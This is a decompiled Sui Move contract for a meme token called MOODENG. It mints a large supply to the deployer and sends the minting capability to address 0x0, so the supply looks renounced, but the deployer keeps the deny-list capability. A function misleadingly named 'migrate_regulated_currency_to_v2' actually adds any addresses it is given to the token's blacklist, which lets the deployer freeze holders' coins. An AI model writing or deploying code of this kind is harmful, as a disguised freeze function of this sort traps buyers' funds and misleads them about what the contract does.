module 0xd08e5d0ba66a10bda4b1e8c087d9b06b34af6dfa3ae1e4eb4b4f7bbfcf2f3555::MOODENG {
    struct MOODENG has drop {
        dummy_field: bool,
    }

    fun init(arg0: MOODENG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<MOODENG>(arg0, 2, b"MOODENG", b"Moodeng On Sui", b"Moodeng On Sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/K8FKGSQs2Iti4QEsiL7fIEYJAkb7RCsKOelk1UCmu5I?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MOODENG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<MOODENG>>(v1, 0x2::tx_context::sender(arg1));
        let v3 = v0;
        0x2::coin::mint_and_transfer<MOODENG>(&mut v3, 42069000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<MOODENG>>(v3, @0x0);
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<MOODENG>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<MOODENG>(arg0, v1)) {
                0x2::coin::deny_list_add<MOODENG>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

